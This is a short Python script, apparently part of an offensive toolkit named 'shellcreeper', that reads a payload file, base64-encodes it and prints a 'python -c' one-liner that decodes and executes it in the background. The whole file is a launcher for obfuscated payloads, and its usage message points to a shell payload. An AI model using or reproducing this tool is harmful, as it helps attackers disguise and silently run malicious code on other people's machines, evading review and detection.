import base64
import sys
import re
import os


def encode(input):
    command = base64.b64encode(input)
    return command

try:

    code = sys.argv[1]
    pay = open(code, 'r')
    pay = pay.read()
    print('python -c \'import base64;exec(base64.b64decode("%s"))\'&' % encode(pay))
except:
    sys.exit("Ex: b64encoder.py <path to shellcreeper python payload>")


#
